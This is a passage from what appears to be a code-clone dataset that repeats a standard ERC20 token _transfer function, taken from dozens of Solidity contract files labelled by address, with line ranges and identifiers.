        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="107" endline="119" pcid="8698">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="107" endline="119" pcid="1970">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="110" endline="122" pcid="7043">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="111" endline="123" pcid="1852">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="106" endline="118" pcid="3795">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="111" endline="123" pcid="8917">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="111" endline="123" pcid="8677">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="112" endline="124" pcid="4276">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="107" endline="119" pcid="8818">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="104" endline="116" pcid="3845">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="116" endline="128" pcid="8773">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="107" endline="119" pcid="5409">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="113" endline="125" pcid="6489">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _NFT[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _NFT[from] = _NFT[from] - amount;
        _NFT[to] = _NFT[to] + amount;
        emit Transfer(from, to, amount);
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="108" endline="120" pcid="5424">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="112" endline="124" pcid="2470">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="108" endline="120" pcid="8265">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="107" endline="119" pcid="5394">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="108" endline="120" pcid="5379">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="109" endline="121" pcid="424">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="107" endline="119" pcid="8250">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="109" endline="121" pcid="1530">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="110" endline="122" pcid="947">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="108" endline="120" pcid="5439">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="111" endline="123" pcid="3432">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="109" endline="121" pcid="1056">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="107" endline="119" pcid="7627">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="111" endline="123" pcid="5454">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="111" endline="123" pcid="3447">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="108" endline="120" pcid="8235">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="108" endline="120" pcid="6691">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="110" endline="122" pcid="2858">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="108" endline="120" pcid="1554">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="106" endline="118" pcid="7749">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="111" endline="123" pcid="6676">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="112" endline="124" pcid="1515">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="108" endline="120" pcid="8557">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="110" endline="122" pcid="5474">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="106" endline="118" pcid="5489">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="109" endline="121" pcid="439">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="109" endline="121" pcid="5361">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="107" endline="119" pcid="5504">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="110" endline="122" pcid="5521">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="111" endline="123" pcid="1495">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="107" endline="119" pcid="3810">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="112" endline="124" pcid="1071">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="110" endline="122" pcid="8220">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="108" endline="120" pcid="5536">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="110" endline="122" pcid="779">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="110" endline="122" pcid="865">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="109" endline="121" pcid="8280">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="106" endline="118" pcid="5339">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="111" endline="123" pcid="5551">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="104" endline="116" pcid="3535">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="107" endline="119" pcid="1152">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="109" endline="121" pcid="4022">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="111" endline="123" pcid="7642">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="108" endline="120" pcid="9064">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="108" endline="120" pcid="2679">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="110" endline="122" pcid="700">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
